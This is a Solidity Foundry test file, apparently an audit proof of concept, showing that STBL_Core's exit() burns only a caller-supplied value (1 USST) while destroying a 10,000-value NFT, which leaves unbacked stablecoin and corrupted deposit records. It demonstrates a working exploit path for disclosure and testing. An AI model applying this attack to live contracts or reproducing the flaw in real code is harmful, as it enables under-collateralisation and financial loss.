// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/STBL_Core.sol";
import "../src/STBL_Structs.sol";

contract SimpleProxy {
    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    constructor(address implementation, bytes memory initData) {
        assembly {
            sstore(IMPLEMENTATION_SLOT, implementation)
        }
        if (initData.length > 0) {
            (bool success, ) = implementation.delegatecall(initData);
            require(success, "Initialization failed");
        }
    }
    
    fallback() external payable {
        assembly {
            let impl := sload(IMPLEMENTATION_SLOT)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
    
    receive() external payable {}
}

contract STBL_Core_ExitBugTest is Test {
    STBL_Core public core;
    SimpleProxy public proxy;

    MockRegistry public registry;
    MockUSST public usst;
    MockYLD public yld;
    
    address public issuer = address(0x1234);
    address public alice = address(0x5678);
    uint256 public constant ASSET_ID = 1;
    
    function setUp() public {
        registry = new MockRegistry();
        usst = new MockUSST();
        yld = new MockYLD();

        registry.setUSSTToken(address(usst));
        registry.setYLDToken(address(yld));
        registry.setIssuer(ASSET_ID, issuer, true);
        registry.setAssetActive(ASSET_ID, true);

        STBL_Core implementation = new STBL_Core();
        
        bytes memory initData = abi.encodeWithSelector(
            STBL_Core.initialize.selector,
            address(registry)
        );
        
        proxy = new SimpleProxy(address(implementation), initData);

        core = STBL_Core(address(proxy));
        
        usst.grantMinter(address(core));
        usst.grantBurner(address(core));
        yld.grantMinter(address(core));
        yld.grantBurner(address(core));
    }
    
    function testExitBug_UnderCollateralization() public {
        // === SETUP PHASE ===
        uint256 DEPOSIT_AMOUNT = 10_000 ether; // 10,000 USST worth of asset
        uint256 WRONG_VALUE = 1 ether;         // Bug: burn only 1 USST
        
        // Create metadata for deposit
        YLD_Metadata memory metadata = YLD_Metadata({
            assetID: ASSET_ID,
            uri: "ipfs://test",
            assetValue: 1 ether,
            stableValueGross: DEPOSIT_AMOUNT,
            stableValueNet: DEPOSIT_AMOUNT,
            depositTimestamp: block.timestamp,
            depositfeeAmount: 0,
            haircutAmount: 0,
            haircutAmountAssetValue: 0,
            withdrawfeeAmount: 0,
            insurancefeeAmount: 0,
            Fees: FeeStruct(0, 0, 0, 0, 0, 0),
            additionalBuffer: "",
            isDisabled: false
        });
        
        // Normal Deposit (put) ===
        vm.startPrank(issuer);
        uint256 nftID = core.put(alice, metadata);
        vm.stopPrank();
        
        // Verify Alice received correct amounts
        assertEq(usst.balanceOf(alice), DEPOSIT_AMOUNT, "Alice should have 10,000 USST");
        assertEq(yld.ownerOf(nftID), alice, "Alice should own the NFT");
        
        // Store NFT metadata to verify later
        yld.setNFTValue(nftID, DEPOSIT_AMOUNT); // NFT stores 10,000 value
        
        // Check initial state
        uint256 usstSupplyBefore = usst.totalSupply();
        uint256 aliceBalanceBefore = usst.balanceOf(alice);
        
        console.log("=== BEFORE EXIT ===");
        console.log("USST Total Supply:", usstSupplyBefore / 1 ether);
        console.log("Alice USST Balance:", aliceBalanceBefore / 1 ether);
        console.log("NFT Value (stored):", DEPOSIT_AMOUNT / 1 ether);
        console.log("Registry Deposits:", registry.getAssetDeposits(ASSET_ID) / 1 ether);
        
        // Exploit exit() with wrong _value 
        // Alice approves USST spending (normal user behavior)
        vm.prank(alice);
        usst.approve(address(core), type(uint256).max);
        
        // Alice approves NFT burning
        vm.prank(alice);
        yld.approve(address(core), nftID);
        
        // Issuer calls exit with WRONG _value
        // Should burn 10,000 USST, but only burns 1 USST
        vm.prank(issuer);
        core.exit(
            ASSET_ID,
            alice,
            nftID,
            WRONG_VALUE  // BUG: Only 1 USST instead of 10,000
        );
        
        //  VERIFICATION: Prove Under-Collateralization 
        uint256 usstSupplyAfter = usst.totalSupply();
        uint256 aliceBalanceAfter = usst.balanceOf(alice);
        uint256 usstBurned = usstSupplyBefore - usstSupplyAfter;
        
        console.log("\n=== AFTER EXIT ===");
        console.log("USST Total Supply:", usstSupplyAfter / 1 ether);
        console.log("Alice USST Balance:", aliceBalanceAfter / 1 ether);
        console.log("USST Burned:", usstBurned / 1 ether);
        console.log("NFT Burned: YES (NFT no longer exists)");
        console.log("Registry Deposits:", registry.getAssetDeposits(ASSET_ID) / 1 ether);
        
        // 1. Only 1 USST was burned (instead of 10,000)
        assertEq(
            usstBurned, 
            WRONG_VALUE, 
            "BUG: Only 1 USST burned instead of 10,000"
        );
        
        // 2. Alice still has 9,999 USST (unbacked)
        uint256 expectedUnbacked = DEPOSIT_AMOUNT - WRONG_VALUE;
        assertEq(
            aliceBalanceAfter,
            expectedUnbacked,
            "BUG: Alice has 9,999 unbacked USST"
        );
        
        // 3. NFT worth 10,000 is destroyed
        vm.expectRevert(); // NFT no longer exists
        yld.ownerOf(nftID);
        
        // 4. Registry is corrupted (only decremented by 1)
        assertEq(
            registry.getAssetDeposits(ASSET_ID),
            DEPOSIT_AMOUNT - WRONG_VALUE,
            "BUG: Registry corrupted"
        );
    
        assertTrue(
            aliceBalanceAfter > 0,
            "BUG: User retains USST without collateral"
        );
    }
}

contract MockRegistry {
    address private usstToken;
    address private yldToken;
    mapping(uint256 => address) private assetIssuers;  
    mapping(uint256 => bool) private activeAssets;
    mapping(uint256 => uint256) private assetDeposits;
    
    function setUSSTToken(address _usst) external {
        usstToken = _usst;
    }
    
    function setYLDToken(address _yld) external {
        yldToken = _yld;
    }
    
    function setIssuer(uint256 assetId, address issuer, bool status) external {
        if (status) {
            assetIssuers[assetId] = issuer;  
        } else {
            delete assetIssuers[assetId];
        }
    }
    
    function setAssetActive(uint256 assetId, bool status) external {
        activeAssets[assetId] = status;
    }
    
    function fetchUSSTToken() external view returns (address) {
        return usstToken;
    }
    
    function fetchYLDToken() external view returns (address) {
        return yldToken;
    }
    
    function fetchAssetData(uint256 assetId) external view returns (AssetDefinition memory) {
        AssetDefinition memory asset;
        asset.id = assetId;
        asset.status = activeAssets[assetId] ? AssetStatus.ENABLED : AssetStatus.DISABLED;
        asset.issuer = assetIssuers[assetId];  
        
        return asset;
    }
    
    function isDepositLimitReached(uint256, uint256) external pure returns (bool) {
        return false;
    }
    
    function incrementAssetDeposits(uint256 assetId, uint256 amount) external {
        assetDeposits[assetId] += amount;
    }
    
    function decrementAssetDeposits(uint256 assetId, uint256 amount) external {
        assetDeposits[assetId] -= amount;
    }
    
    function getAssetDeposits(uint256 assetId) external view returns (uint256) {
        return assetDeposits[assetId];
    }
}

contract MockUSST {
    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;
    mapping(address => bool) private minters;
    mapping(address => bool) private burners;
    uint256 private _totalSupply;
    
    function grantMinter(address account) external {
        minters[account] = true;
    }
    
    function grantBurner(address account) external {
        burners[account] = true;
    }
    
    function mint(address to, uint256 amount) external {
        require(minters[msg.sender], "Not minter");
        balances[to] += amount;
        _totalSupply += amount;
    }
    
    function burn(address from, uint256 amount) external {
        require(burners[msg.sender], "Not burner");
        require(balances[from] >= amount, "Insufficient balance");
        balances[from] -= amount;
        _totalSupply -= amount;
    }
    
    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }
    
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowances[msg.sender][spender] = amount;
        return true;
    }
    
    function allowance(address owner, address spender) external view returns (uint256) {
        return allowances[owner][spender];
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balances[from] >= amount, "Insufficient balance");
        require(allowances[from][msg.sender] >= amount, "Insufficient allowance");
        balances[from] -= amount;
        balances[to] += amount;
        allowances[from][msg.sender] -= amount;
        return true;
    }
}

contract MockYLD {
    mapping(uint256 => address) private owners;
    mapping(uint256 => address) private approvals;
    mapping(uint256 => uint256) private nftValues;
    mapping(address => bool) private minters;
    mapping(address => bool) private burners;
    uint256 private nextTokenId = 1;
    
    function grantMinter(address account) external {
        minters[account] = true;
    }
    
    function grantBurner(address account) external {
        burners[account] = true;
    }
    
    function mint(address to, YLD_Metadata memory metadata) external returns (uint256) {
        require(minters[msg.sender], "Not minter");
        uint256 tokenId = nextTokenId++;
        owners[tokenId] = to;
        nftValues[tokenId] = metadata.stableValueNet;
        return tokenId;
    }
    
    function burn(address from, uint256 tokenId) external {
        require(burners[msg.sender], "Not burner");
        require(owners[tokenId] == from, "Not owner");
        delete owners[tokenId];
        delete nftValues[tokenId];
    }
    
    function ownerOf(uint256 tokenId) external view returns (address) {
        address owner = owners[tokenId];
        require(owner != address(0), "Token does not exist");
        return owner;
    }
    
    function approve(address to, uint256 tokenId) external {
        require(owners[tokenId] == msg.sender, "Not owner");
        approvals[tokenId] = to;
    }
    
    function setNFTValue(uint256 tokenId, uint256 value) external {
        nftValues[tokenId] = value;
    }
    
    function getNFTData(uint256 tokenId) external view returns (YLD_Metadata memory) {
        YLD_Metadata memory metadata;
        metadata.stableValueNet = nftValues[tokenId];
        return metadata;
    }
    
    function balanceOf(address) external pure returns (uint256) { 
        return 0; 
    }
    
    function safeTransferFrom(address, address, uint256, bytes calldata) external {}
    
    function safeTransferFrom(address, address, uint256) external {}
    
    function transferFrom(address, address, uint256) external {}
    
    function getApproved(uint256) external pure returns (address) { 
        return address(0); 
    }
    
    function setApprovalForAll(address, bool) external {}
    
    function isApprovedForAll(address, address) external pure returns (bool) { 
        return false; 
    }
    
    function supportsInterface(bytes4) external pure returns (bool) { 
        return true; 
    }
}